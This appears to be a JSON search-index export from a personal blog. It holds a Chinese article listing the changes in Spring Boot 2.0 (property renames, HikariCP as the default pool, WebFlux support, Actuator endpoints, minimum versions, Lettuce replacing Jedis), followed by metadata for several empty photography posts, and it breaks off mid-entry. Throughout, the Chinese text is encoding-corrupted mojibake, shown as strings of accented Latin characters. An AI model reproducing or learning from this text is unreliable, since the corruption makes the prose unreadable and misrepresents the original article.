è¦ä½¿ç”¨TomcatEmbeddedServletContainerFactoryå›è°ƒæ¥å£æ¥è‡ªå®šä¹‰å†…åµŒTomcatå®¹å™¨ï¼Œä½ ç°åœ¨åº”è¯¥ä½¿ç”¨TomcatServletWebServerFactoryã€‚Servlet-specific çš„server propertiesè°ƒæ•´å¤§é‡çš„Servletä¸“å±çš„server.* propertiesè¢«ç§»åˆ°äº†server.servletä¸‹ï¼šç”±æ­¤å¯ä»¥çœ‹å‡ºä¸€äº›ç«¯å€ªï¼Œé‚£å°±æ˜¯serverä¸å†æ˜¯åªæœ‰servletäº†ï¼Œè¿˜æœ‰å…¶ä»–çš„è¦åŠ å…¥ã€‚Actuator é»˜è®¤æ˜ å°„Actuatorçš„ç«¯ç‚¹ï¼ˆendpointï¼‰ç°åœ¨é»˜è®¤æ˜ å°„åˆ°/applicationï¼Œæ¯”å¦‚ï¼Œ/info ç«¯ç‚¹ç°åœ¨å°±æ˜¯åœ¨/application/infoã€‚ä½†ä½ å¯ä»¥ä½¿ç”¨management.context-pathæ¥è¦†ç›–æ­¤é»˜è®¤å€¼ã€‚@ConditionalOnBean@ConditionalOnBeanç°åœ¨çš„åˆ¤æ–­æ¡ä»¶ç”±ORå˜ä¸ºäº†ANDã€‚Remote CRaSH shell1.5çš„æ—¶å€™æ­¤è¿œç¨‹å·¥å…·è¢«æ ‡ä¸ºdeprecatedï¼Œ2.0çš„æ—¶å€™å°†ä¼šæŠŠè¿™ä¸ªæ”¯æŒå½»åº•removeæ‰ï¼Œä»¥åŠåŸºäºæ­¤åŠŸèƒ½çš„é¡¹ç›®ä¹Ÿä¼šè¢«åˆ é™¤æ‰ã€‚Spring Loadedä¸å†æ”¯æŒç”±äºSpring Loadedé¡¹ç›®å·²è¢«ç§»åˆ°äº†atticäº†ï¼Œæ‰€ä»¥ä¸å†æ”¯æŒSpring Loadedäº†ã€‚ç°åœ¨å»ºè®®ä½ å»ä½¿ç”¨Devtoolsã€‚Spring Loadedä¸å†æ”¯æŒäº†ã€‚Hazelcastè‡ªåŠ¨é…ç½®ä¸å†æ”¯æŒä¸èƒ½å†è‡ªåŠ¨é…ç½®HazelcastInstanceè¿›è¡Œç¼“å­˜ã€‚ å› æ­¤ï¼Œspring.cache.hazelcast.configå±æ€§ä¸å†å¯ç”¨ã€‚é»˜è®¤connection poolå˜äº†é»˜è®¤çš„è¿æ¥æ± å·²ç»ç”±Tomcatåˆ‡æ¢åˆ°äº†HikariCPã€‚å¦‚æœä½ è¿‡å»ä½¿ç”¨spring.datasource.typeåœ¨åŸºäºTomcatçš„åº”ç”¨ç¨‹åºä¸­å¼ºåˆ¶ä½¿ç”¨Hikariï¼Œç°åœ¨ä½ å¯ä»¥åˆ é™¤è¿™ä¸ªè¦†ç›–äº†ã€‚åŒæ ·çš„ï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨Tomcatçš„è¿æ¥æ± ï¼Œåªéœ€è¦ç®€å•çš„åŠ å…¥ä»¥ä¸‹é…ç½®å°±å¯ä»¥äº†ï¼šspring.datasource.type=org.apache.tomcat.jdbc.pool.DataSourceServlet Filtersé’ˆå¯¹ä¸€ä¸ªFilteré»˜è®¤çš„dispatcherç±»å‹ç°åœ¨ä¸º DipatcherType.REQUESTï¼Œè¿™æ ·å°±ä¿è¯äº†Spring Bootå’ŒServleté»˜è®¤çš„é…ç½®ç»Ÿä¸€äº†ã€‚Spring SecuritySpring Securityçš„ filter ç°åœ¨å¯ä»¥è‡ªåŠ¨é…ç½®å¦‚ä¸‹ç±»å‹äº†ï¼š ASYNC, ERROR, and REQUEST ã€‚è¿™æ ·å°±è®©Spring Bootä¸­çš„é…ç½®å’ŒSpring Securityé»˜è®¤é…ç½®ä¿æŒä¸€è‡´äº†ã€‚Spring SessionSpring Sessionçš„ filter ç°åœ¨æ”¯æŒè‡ªåŠ¨é…ç½®å¦‚ä¸‹dispatcherç±»å‹ ASYNC, ERROR, and REQUEST ã€‚åŒæ ·æ˜¯ä¸ºäº†è®©Spring Bootçš„é…ç½®ä¸Spring Sessionçš„é»˜è®¤é…ç½®ä¿æŒä¸€è‡´ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ä»Spring Session 2.0èµ·, Mongoå’ŒGemFire å°†ä¸å†è¢«æ”¯æŒã€‚Jettyè¦æ±‚Jettyæœ€ä½ç‰ˆæœ¬ä¸º9.4ã€‚Tomcatè¦æ±‚Tomcatæœ€ä½ç‰ˆæœ¬ä¸º8.5ã€‚Hibernateè¦æ±‚Hibernateæœ€ä½ç‰ˆæœ¬ä¸º5.2ã€‚Gradleè¦æ±‚Gradleæœ€ä½ç‰ˆæœ¬ä¸º3.4ã€‚SendGridSendGridæœ€ä½æ”¯æŒç‰ˆæœ¬æ˜¯3.2ã€‚ä¸ºäº†æ”¯æŒè¿™æ¬¡å‡çº§ï¼Œusernameå’Œpasswordå·²ç»è¢«å¹²æ‰äº†ã€‚å› ä¸ºAPI keyç°åœ¨æ˜¯å”¯ä¸€æ”¯æŒçš„è®¤è¯æ–¹å¼ã€‚Starter çš„ä¼ é€’ä¾èµ–çš„æ”¹å˜ä»¥å‰æœ‰å‡ ä¸ªSpring Boot starteræ˜¯ä¾é Spring MVCå’Œspring-boot-starter-webä¼ é€’çš„ã€‚ ä¸ºäº†å¯¹Spring WebFluxçš„æ”¯æŒï¼Œspring-boot-starter-mustacheå’Œspring-boot-starter-thymeleafä¸å†ä¾èµ–spring-boot-starter-webã€‚ç°åœ¨ä½ è¦è‡ªå·±é€‰æ‹©å¹¶æ·»åŠ spring-boot-starter-webæˆ–spring-boot-starter-webfluxä½œä¸ºä¾èµ–ã€‚è®°ä½ï¼šwebå’Œwebfluxæ˜¯å¹³è¡Œçš„å…³ç³»ã€‚æˆ‘ä»¬ä¹‹å‰çš„æ–‡ç« ä¸­æåˆ°è¿‡spring webfluxã€‚ä½ å¯ä»¥ç§»æ­¥æŸ¥çœ‹ï¼šSpring 5 æ–°å¢å…¨æ–°çš„reactive webæ¡†æ¶ï¼šwebfluxã€‚Solrå¥åº·æŒ‡æ ‡é’ˆå¯¹Solrçš„å¥åº·æ£€æŸ¥ä¿¡æ¯ä¸å†æ˜¯solrStatusè¿™ä¸ªå±æ€§äº†ã€‚ç°åœ¨æ˜¯status propertyï¼Œæ˜¯ä¸€ä¸ªæ ‡å‡†çŠ¶æ€å±æ€§ï¼Œå¯¹åº”äºä¸€ä¸ªçš„æ•´å‹å€¼ã€‚é»˜è®¤ä»£ç†ç­–ç•¥Spring Bootç°åœ¨é»˜è®¤æ˜¯ä½¿ç”¨CGLIBä»£ç†ï¼ŒåŒæ—¶åŒ…å«AOPæ”¯æŒã€‚å¦‚æœä½ éœ€è¦åŸºäºä»£ç†ï¼ˆproxy-basedï¼‰çš„ä»£ç†ç­–ç•¥ï¼Œä½ éœ€è¦æŠŠspring.aop.proxy-target-classè®¾ç½®ä¸ºfalseã€‚åŸºäºCLIçš„æµ‹è¯•ä»Spring Bootçš„CLIä¸­åˆ é™¤äº†æµ‹è¯•æ”¯æŒï¼Œç°åœ¨å»ºè®®ä½ ä½¿ç”¨Mavenæˆ–Gradleæ„å»ºåº”ç”¨ç¨‹åºï¼Œå»ä½¿ç”¨å®ƒä»¬æä¾›çš„ä¸°å¯Œçš„æµ‹è¯•æ”¯æŒå§ã€‚@ConfigurationProperties@ConfigurationPropertiesé‡Œçš„ignoreNestedPropertieså±æ€§å·²è¢«åˆ é™¤ã€‚Multiparté…ç½®æ”¹å˜ä¸ºäº†æ›´å¥½çš„åæ˜ Servletçš„ç‰¹æ€§, spring.http.multipart. å±æ€§å·²ç»è¢«å‘½åä¸º spring.servlet.multipartã€‚psï¼šå…¶å®å°±æ˜¯å› ä¸ºwebfluxæ¥äº†ï¼Œåªèƒ½æŠŠservletå’ŒwebfluxåŒºåˆ†å¼€æ¥ã€‚Mustache æ¨¡æ¿é»˜è®¤æ–‡ä»¶æ‰©å±•åè¿‡å»Mustacheæ¨¡æ¿çš„é»˜è®¤çš„æ–‡ä»¶æ‰©å±•åæ˜¯.htmlã€‚ç°åœ¨.mustacheæˆäº†å®˜æ–¹æŒ‡å®šçš„æ‰©å±•åï¼Œè€Œä¸”å¾ˆå¤šçš„IDEæ’ä»¶å·²ç»æ”¯æŒäº†æ­¤åç¼€ã€‚ä½ å¯ä»¥é€šè¿‡spring.mustache.suffixæ¥è¦†ç›–ç°åœ¨çš„é»˜è®¤çš„æ”¯æŒã€‚Spring Framework 5.0Spring Boot 2.0 æ˜¯å»ºç«‹åœ¨Spring Framework 5.0ä¹‹ä¸Šçš„ï¼ˆæœ€ä½è¦æ±‚ï¼‰ã€‚Spring 5æœ€å¤§çš„äº®ç‚¹å°±æ˜¯reactiveã€‚ä½ å¯ä»¥å»çœ‹çœ‹è¿™ç¯‡ï¼šSpring 5 æ–°å¢å…¨æ–°çš„reactive webæ¡†æ¶ï¼šwebfluxã€‚æ¾ç»‘å®šæ”¹å–„æ¾ç»‘å®šå·²ç»å¾—åˆ°æ”¹å–„ã€‚è¿™é‡Œç®€å•çš„ä¸¾ä¸ªä¾‹å­ï¼šç®€å•çš„å±æ€§åœ¨åˆ é™¤ç‰¹æ®Šå­—ç¬¦ç„¶åè½¬æˆå°å†™åè¿›è¡Œç»‘å®šã€‚æ¯”å¦‚ï¼šä¸‹é¢çš„å±æ€§æœ€ç»ˆéƒ½ä¼šè¢«æ˜ å°„ä¸ºspring.jpa.databaseplatform=mysql:spring.jpa.database-platform=mysqlspring.jpa.databasePlatform=mysqlspring.JPA.database_platform=mysqlæœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥é˜…ï¼šhttps://github.com/spring-projects/spring-boot/wiki/Relaxed-Binding-2.0WebFlux å’Œ WebFlux.fnæ”¯æŒSpring Boot 2.0 æä¾›äº†ä¸€ä¸ªæ–°çš„starter ï¼Œç”¨æ¥æ”¯æŒReactive Spring web frameworksã€‚è¯¥starterä¸ºspring-boot-starter-webfluxã€‚å…¶ä¸­Reactor Nettyæ˜¯é»˜è®¤çš„webå¼•æ“(spring-boot-starter-reactor-netty)ã€‚Reactiveæ•°æ®åº“æ”¯æŒSpring Boot 2.0 å¯¹ä¸€ä¸‹çš„æ•°æ®åº“æä¾›äº†è‡ªåŠ¨é…ç½®ï¼ˆ auto-configuration ï¼‰çš„reactiveçš„æ”¯æŒï¼šMongoDB (spring-boot-starter-data-mongodb-reactive)Redis (spring-boot-starter-data-redis-reactive)Cassandra (spring-boot-starter-data-cassandra-reactive)@DataMongoTestæµ‹è¯•æ³¨è§£ä¹Ÿæ˜¯æ”¯æŒreactiveçš„ã€‚@WebFluxTestæ”¯æŒReactive controllerç°åœ¨å¯ä»¥ä½¿ç”¨@WebFluxTestæ¥æµ‹è¯•ã€‚å®ƒæä¾›çš„åŠŸèƒ½å’Œ @WebMvcTestç±»ä¼¼ã€‚è€Œä¸”WebTestClientå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œå·²ç»è¢«è‡ªåŠ¨é…ç½®ï¼ˆauto-configuredï¼‰äº†ã€‚æ”¯æŒä½¿ç”¨@SpringBootTestè‡ªåŠ¨é…ç½®WebTestClientå½“ä½ ä½¿ç”¨@SpringBootTest with an actual server (that is, either DEFINED_PORT or RANDOM_PORT), a WebTestClient is available the same way TestRestTemplate is.ä½¿ç”¨@SpringBootTestè¿›è¡ŒWebTestClientè‡ªåŠ¨é…ç½®å°†@SpringBootTestç”¨äºå®é™…æœåŠ¡å™¨ï¼ˆå³DEFINED_PORTæˆ–RANDOM_PORTï¼‰æ—¶ï¼ŒWebTestClientçš„å¯ç”¨æ–¹å¼ä¸TestRestTemplateç›¸åŒã€‚Gradleæ’ä»¶Spring Bootçš„Gradleæ’ä»¶å·²åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šè¢«é‡å†™ï¼Œä»¥å®ç°ä¸€äº›é‡å¤§çš„æ”¹è¿›ã€‚æœ‰å…³è¿™æ–¹é¢çš„å°±ä¸ç»†è®²äº†ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥å»ä¸€æ¢ç©¶ç«Ÿã€‚/loggersç«¯ç‚¹POSTçš„çŠ¶æ€ç æ”¹å˜é’ˆå¯¹/loggersç«¯ç‚¹ä¸ŠPOSTæ“ä½œçš„çŠ¶æ€ç å·²åˆ200æ”¹ä¸º204ã€‚ElasticsearchElasticsearchå·²å‡çº§åˆ°5.4ã€‚ ä¸Elasticå…¬å¸å®£å¸ƒä¸å†æ”¯æŒåµŒå…¥å¼Elasticsearchçš„æƒ…å†µä¸€æ ·ï¼ŒNodeClientçš„è‡ªåŠ¨é…ç½®å·²è¢«åˆ é™¤ã€‚å°±æ˜¯è¿™ä¹ˆçš„èŠ‚å¥ä¸€è‡´ã€‚ç°åœ¨ä½ å¯ä»¥é€šè¿‡ä½¿ç”¨spring.data.elasticsearch.cluster-nodesè‡ªåŠ¨é…ç½®TransportClientï¼Œå…·ä½“valueå¯ä»¥æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ªè¦è¿æ¥çš„èŠ‚ç‚¹çš„åœ°å€ã€‚Quartz SchedulerSpring Boot 2 é’ˆå¯¹Quartzè°ƒåº¦å™¨æä¾›äº†æ”¯æŒã€‚ä½ å¯ä»¥åŠ å…¥spring-boot-starter-quartz starteræ¥å¯ç”¨ã€‚è€Œä¸”æ”¯æŒåŸºäºå†…å­˜å’ŒåŸºäºjdbcä¸¤ç§å­˜å‚¨ã€‚Spring Data Webé…ç½®Spring Bootå…¬å¼€äº†ä¸€ä¸ªæ–°çš„spring.data.webé…ç½®åç§°ç©ºé—´ï¼Œå¯ä»¥è½»æ¾é…ç½®åˆ†é¡µå’Œæ’åºã€‚Json starterä¸€ä¸ªå…¨æ–°çš„spring-boot-starter-json starter èšåˆäº†å¾ˆå¤šå¸¸ç”¨çš„jsonå·¥å…·ï¼Œå¯ä»¥æ”¯æŒå¯¹jsonçš„è¯»å†™ã€‚å®ƒä¸ä»…ä»…æä¾›äº†jackson-databindè€Œä¸”å½“ä½ ä½¿ç”¨java8æ—¶å€™ï¼Œè¿˜æä¾›äº†æœ‰ç”¨çš„æ¨¡å—ï¼šjackson-datatype-jdk8, jackson-datatype-jsr310 å’Œ jackson-module-parameter-namesã€‚ä¹‹å‰ä½¿ç”¨jackson-databindçš„åœ°æ–¹å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–°çš„starteräº†ã€‚Thymeleaf starterThymeleaf starterç°åœ¨åŒ…å«äº†thymeleaf-extras-java8timeï¼Œå¼€ç®±å³ç”¨ã€‚InfluxDBå¦‚æœInfluxDB java client å’Œ the spring.influx.url è¢«è®¾ç½®, ä¸€ä¸ªInfluxDB clientç°åœ¨å°±ä¼šè¢«è‡ªåŠ¨é…ç½®ã€‚è€Œä¸”ç°åœ¨æ”¯æŒè®¤è¯ã€‚JdbcTemplateSpring Bootè‡ªåŠ¨é…ç½®ï¼ˆauto-configurationï¼‰çš„JdbcTemplateç°åœ¨å¯ä»¥é€šè¿‡spring.jdbc.templateå‘½åç©ºé—´è¿›è¡Œå®šåˆ¶ã€‚ æ­¤å¤–ï¼Œè‡ªåŠ¨é…ç½®ï¼ˆauto-configurationï¼‰çš„NamedParameterJdbcTemplateåœ¨åº•å±‚å°±æ˜¯JdbcTemplateã€‚jOOQSpring Bootç°åœ¨å¯ä»¥æ ¹æ®DataSourceè‡ªåŠ¨æ£€æµ‹å‡ºjOOQæ–¹è¨€ï¼ˆç±»ä¼¼äºJPAæ–¹è¨€ï¼‰ã€‚æ­¤å¤–ï¼Œè¿˜å¼•å…¥äº†@JooqTestç”¨äºåªæœ‰jOOQæ‰èƒ½holdçš„æµ‹è¯•åœºæ™¯ã€‚@DataRedisTestæ–°åŠ äº†ä¸€ä¸ªæµ‹è¯•çš„æ—¶å€™é’ˆå¯¹redisçš„æ–°æ³¨è§£ã€‚å¼ºå¤§çš„Mongoå®¢æˆ·ç«¯è‡ªå®šä¹‰ç°åœ¨å¯ä»¥é€šè¿‡MongoClientSettingsBuilderCustomizerè¿™ä¸ªbeanæ¥é«˜åº¦å®šåˆ¶åŒ–Spring Bootçš„Mongoå®¢æˆ·ç«¯ã€‚Cassandraspring.data.cassandra ç°åœ¨æ”¯æŒæ± åŒ–ï¼ˆpoolingï¼‰ã€‚Kafka listeneræ”¯æŒæ‰¹é‡æ¶ˆè´¹ç°åœ¨æ”¯æŒä¸€æ¬¡æ€§æ‰¹é‡æ¶ˆè´¹å¤šä¸ªConsumerRecordï¼Œä½ å¯ä»¥åˆ›å»ºä¸€æ‰¹çš„ç›‘å¬å™¨ï¼ˆlistenerï¼‰ï¼Œè¿™æ ·è®¾ç½®ï¼šspring.kafka.listener.type=batchWeb filters åˆå§‹åŒ–Web filters ç°åœ¨åœ¨æ‰€æœ‰æ”¯æŒçš„å®¹å™¨ä¸­éƒ½ä¼šè¢«ç«‹åˆ»åˆå§‹åŒ–ã€‚ä¹Ÿå°±æ˜¯eagerlyï¼Œæ€¥åŠ è½½ã€‚Auto-configuration æŠ¥å‘Šç°åœ¨ä¸æ»¡è¶³æ¡ä»¶ï¼ˆunconditionalï¼‰çš„classä¹Ÿä¼šè¢«åŒ…å«è¿›æ¥ï¼Œåœ¨è‡ªåŠ¨é…ç½®ï¼ˆauto-configurationï¼‰çš„Actuatorç«¯ç‚¹çš„responseä¸­ä¸€å¹¶è¿”å›ã€‚é‡ç½®loggeræ“ä½œç°åœ¨Loggersç«¯ç‚¹ï¼ˆendpointï¼‰ æ”¯æŒresetæ—¥å¿—çº§åˆ«åˆ°é»˜è®¤è®¾ç½®ã€‚Maven æ’ä»¶å±æ€§æ’ä»¶çš„é…ç½®å±æ€§ç°åœ¨çš„æš´éœ²æ–¹å¼æœ‰æ‰€æ”¹å˜ï¼Œç°åœ¨æ‰€æœ‰çš„éƒ½æ˜¯ä»¥spring-bootä¸ºå‰ç¼€ï¼Œè¿™æ˜¯ä¸ºäº†é¿å…å’Œå…¶ä»–æ’ä»¶å†²çªè€Œå¯¼è‡´é”™è¯¯ã€‚æ¯”å¦‚ï¼Œä»¥ä¸‹å‘½ä»¤è¡Œå¯ä»¥å¯ç”¨profile fooï¼šmvn spring-boot:run -Dspring-boot.run.profiles=fooDevtools è¿œç¨‹è°ƒè¯•å·²ç»ä»Devtoolsä¸­åˆ é™¤äº†é€šè¿‡HTTPè¿›è¡Œè¿œç¨‹è°ƒè¯•çš„æ”¯æŒã€‚ï¼ˆï¼ƒ9489ï¼‰Jettyä¸ºäº†å’ŒTomcatå’ŒUndertowçœ‹é½ï¼Œç°åœ¨å¯¹Jettyçš„æ‰€æœ‰çš„http methodçš„è¯·å»éƒ½è¿›è¡Œå‹ç¼©ï¼Œè€Œä¸æ˜¯ä¹‹å‰é‚£æ ·åªå¯¹GET requestè¿›è¡Œå‹ç¼©(#8184)ã€‚Reactive server è‡ªå®šä¹‰å½“é…ç½®ä¸€ä¸ªreactive web serveræ—¶ï¼Œé’ˆå¯¹Jettyï¼ŒTomcatï¼ŒUndertowçš„å®šåˆ¶åŒ–å™¨ç°åœ¨ä¼šè¢«è°ƒç”¨ (#9572)ã€‚JolokiaJolokiaä¸å†æ˜¯ä¸€ä¸ªendpointã€‚å¹¶ä¸”é»˜è®¤æ˜¯ç¦ç”¨çš„ï¼Œè¿™å·²å’Œå…¶ä»–çš„webç«¯ç‚¹ä¿æŒäº†ä¸€ç›´ã€‚å®ƒçš„é…ç½®å·²è½¬ç§»åˆ°äº†management.jolokiaã€‚å¦‚æœæƒ³å¯ç”¨ Jolokia, å‘ä½ çš„é…ç½®åŠ å…¥management.jolokia.enabled=trueå°±å¯ä»¥äº†ã€‚æ•°æ®åº“è¿ç§»Liquibase å’Œ Flyway é…ç½®çš„key å·²è¢«è½¬ç§»åˆ°äº†spring çš„å‘½åç©ºé—´ä¸‹ï¼š(æ¯”å¦‚ï¼š spring.liquibase and spring.flyway )ã€‚Auto-configurationæ’åº@AutoConfigureOrder é»˜è®¤å€¼ç”±Ordered.LOWEST_PRECEDENCEå˜ä¸º0ã€‚ (#10142)Auto-configurationæµ‹è¯•å·¥å…·ä¸€ä¸ªæ–°çš„ApplicationContextRunner æµ‹è¯•å·¥å…·è®©æˆ‘ä»¬æµ‹è¯•è‡ªåŠ¨é…ç½®å˜å¾—å®¹æ˜“ã€‚ æœªæ¥å°†ä¼šæŠŠæ‰€æœ‰çš„æµ‹è¯•å¥—ä»¶éƒ½è¿ç§»åˆ°è¿™ä¸ªæ¨¡å‹ä¸Šã€‚Java 9 æ”¯æŒåŸºæœ¬æ”¯æŒäº†Java 9ã€‚ä¹‹æ‰€ä»¥æ˜¯â€œåŸºæœ¬â€ï¼Œæ˜¯å› ä¸ºè¿˜æ²¡å¾—åˆ°ç”¨æˆ·çš„éªŒè¯ã€‚Jediså˜ä¸ºäº†LettuceRediså®¢æˆ·ç«¯é©±åŠ¨ç°åœ¨ç”±Jediså˜ä¸ºäº†Lettuceã€‚ä½¿ç”¨Jedisçš„åŒå­¦ä»¬ï¼Œå¤§æ¦‚çŸ¥é“æ–¹å‘äº†å§ã€‚ä½†ä»ç„¶æ”¯æŒJedisï¼Œé‚£ä¹ˆexcludeæ‰io.lettuce:lettuce-coreï¼Œç„¶åæ·»åŠ  redis.clients:jediså°±æ˜¯äº†ã€‚OAuth 2.0 æ”¯æŒSpring Security OAuth é¡¹ç›®ä¸­çš„åŠŸèƒ½å°†ä¼šè¿ç§»åˆ°Spring Securityä¸­ã€‚å°†ä¼šOAuth 2.0ã€‚Mockito 1.xMockito 1.xä¸å†æ”¯æŒ@MockBeanå’Œ@SpyBeanã€‚ å¦‚æœä½ ä¸ä½¿ç”¨spring-boot-starter-testæ¥ç®¡ç†ä¾èµ–å…³ç³»ï¼Œåˆ™åº”å‡çº§åˆ°Mockito 2.xã€‚JSON-B æ”¯æŒé™¤äº†Jackson å’Œ Gsonï¼Œç°åœ¨è¿˜æ”¯æŒäº†JSON-B ã€‚JSONæµ‹è¯•æ”¯æŒä¹Ÿå·²æ›´æ–°ä¸ºæ–°çš„JsonbTesterç±»ã€‚Session EndpointSpring Session ç”¨ç°åœ¨å¯ä»¥é€šè¿‡/application/sessions Actuator Endpointè¿›è¡ŒæŸ¥æ‰¾å’Œåˆ é™¤sessionã€‚ConfigurationProperties éªŒè¯å¦‚æœä½ å¸Œæœ›@ConfigurationPropertieså¯¹è±¡ä¸Šå¼€å¯éªŒè¯ï¼Œé‚£ä¹ˆåªéœ€è¦æ·»åŠ  @Validatedå°±å¯ä»¥äº†ã€‚Spring Mobileé’ˆå¯¹Spring Mobileçš„è‡ªåŠ¨é…ç½®å’Œä¾èµ–ä¸å†æ”¯æŒï¼Œå·²è¢«åˆ é™¤ã€‚æ±—ï¼Œæˆ‘ä»¬ä¹‹å‰çš„æ–‡ç« ä¸­è¿˜ä»‹ç»è¿‡è¿™ä¸ªé¡¹ç›®ï¼šä½¿ç”¨Spring Bootå¼€å‘ä¸€ä¸ªSpring Mobileç¨‹åºã€‚Spring WebFluxæ”¯æŒé”™è¯¯çº¦å®šSpring Bootç°åœ¨è®©WebFluxçš„é”™è¯¯çº¦å®šå’ŒMVCä¿æŒä¸€è‡´å°±åƒä½¿ç”¨MVCä¸€æ ·ï¼šé»˜è®¤è§†å›¾å’ŒJSONå“åº”é”™è¯¯ï¼Œè‡ªå®šä¹‰é”™è¯¯è§†å›¾ç­‰ç­‰ã€‚TLS é…ç½® å’Œ HTTP/2 æ”¯æŒä½ ç°åœ¨å¯ä»¥ä¸ºä½ çš„WebFluxåº”ç”¨é…ç½®SSLï¼Œä½¿ç”¨server.ssl.* é…ç½®å±æ€§ã€‚Tomcat, Jetty, Undertow å’Œ Reactor Nettyéƒ½æ”¯æŒã€‚ä½ ç°åœ¨ä¹Ÿå¯ä»¥ä¸ºä½ çš„MVC æˆ– WebFluxåº”ç”¨é…ç½®HTTP/2ï¼šä½¿ç”¨server.http2.enabledã€‚@KafkaListeneræ”¯æŒä½¿ç”¨@SendToä½¿ç”¨äº†è‡ªåŠ¨é…ç½®å·¥å‚çš„Kafka listenerç°åœ¨æ”¯æŒ@SendToã€‚Kotlinæ‰©å±•Spring Boot 2.0 å‘å¸ƒäº†Kotlin runApplicationæ‰©å±•ï¼špackage com.example.demoimport org.springframework.boot.autoconfigure.SpringBootApplicationimport org.springframework.boot.runApplication@SpringBootApplicationclass DemoApplicationfun main(args: Array) {runApplication&lt;DemoApplication&gt;(*args) }Job command line runner é¡ºåºCommandLineRunner ç°åœ¨æ‰§è¡Œæ‰¹å¤„ç†jobçš„å¯åŠ¨orderæ˜¯0ã€‚æ”¯æŒè‡ªåŠ¨é…ç½®çš„æ¨¡æ¿åŒ–æ¬¢è¿é¡µSpring Boot 2.0 ç°åœ¨æ”¯æŒé™æ€å’Œæ¨¡æ¿åŒ–ä¸¤ç§æ¬¢è¿é¡µç±»å‹ã€‚å®ƒä¼šé¦–å…ˆå»é…ç½®å¥½çš„é™æ€å†…å®¹çš„ç›®å½•ä¸‹æŸ¥æ‰¾index.htmlæ–‡ä»¶ï¼Œå¦‚æœæ²¡æ‰¾åˆ°ï¼Œç„¶åå°±å»æŸ¥æ‰¾indexæ¨¡æ¿ã€‚ åªè¦æ‰¾åˆ°äº†ä¸€ä¸ªå°±ä¼šè¢«ç”¨ä½œæ¬¢è¿é¡µã€‚Context pathä¼šåœ¨å¯åŠ¨æ—¶è¢«æ‰“å°åœ¨Spring Bootä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œå¯¹context pathè²Œä¼¼å¹¶æ²¡æœ‰é‚£ä¹ˆçš„é‡è§†ä¸€æ ·ã€‚ç°åœ¨å½“æˆ‘ä»¬ä½¿ç”¨å†…åµŒå®¹å™¨çš„æ—¶å€™ï¼Œ context path ä¼šè¢«æ‰“å°åœ¨HTTP ç«¯å£çš„æ—è¾¹ï¼Œåƒè¿™æ ·ï¼šTomcat started on port(s): 8080 (http) with context path â€˜/fooâ€™æµ‹è¯•ä¼˜åŒ–ï¼Œè‡ªåŠ¨æ‰«æConverterå’ŒGenericConverterConverter å’Œ GenericConverter beansç°åœ¨å¯ä»¥è¢«@WebMvcTestå’Œ@WebFluxTestè‡ªåŠ¨æ‰«æåˆ°äº†ã€‚Health vs. Statusstatus endpoint å·²ç»è¢«åˆ é™¤äº†ï¼Œç°åœ¨æ”¹æˆäº†healthã€‚è¿™ä¸ªhealth ç«¯ç‚¹æ—¢å¯ä»¥å±•ç¤ºstatusä¹Ÿå¯ä»¥æœ‰æ›´å¤šçš„ç»†èŠ‚ã€‚ health ç«¯ç‚¹ç°åœ¨é»˜è®¤æ˜¯è¢«æš´éœ²çš„ï¼ˆåªå±•ç¤ºstatusï¼‰ã€‚å¦‚æœä½ å¸Œæœ›å±•ç¤ºæ›´å¤šçš„ç»†èŠ‚ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹å±æ€§management.endpoints.health.show-detailsæ¥å®ç°ï¼šmanagement.endpoints.health.show-details=true","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"java","slug":"java","permalink":"https://wangxiuwen.github.io/tags/java/"},{"name":"SpringBoot2.0","slug":"SpringBoot2-0","permalink":"https://wangxiuwen.github.io/tags/SpringBoot2-0/"},{"name":"Spring","slug":"Spring","permalink":"https://wangxiuwen.github.io/tags/Spring/"}],"author":"baipeng"},{"title":"å…‰çº¿","slug":"history/shoot/5a94c78cf5087a54058a83cf","date":"2018-02-27T02:50:52.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5a94c78cf5087a54058a83cf/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a94c78cf5087a54058a83cf/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"å­˜å‚¨ç©ºé—´","slug":"history/shoot/5a7acdb7f5087a54058a83ce","date":"2018-02-06T21:58:15.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5a7acdb7f5087a54058a83ce/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a7acdb7f5087a54058a83ce/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"æµ‹å…‰è¡¨","slug":"history/shoot/5a7acc8df5087a54058a83cd","date":"2018-02-06T21:53:17.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5a7acc8df5087a54058a83cd/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a7acc8df5087a54058a83cd/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ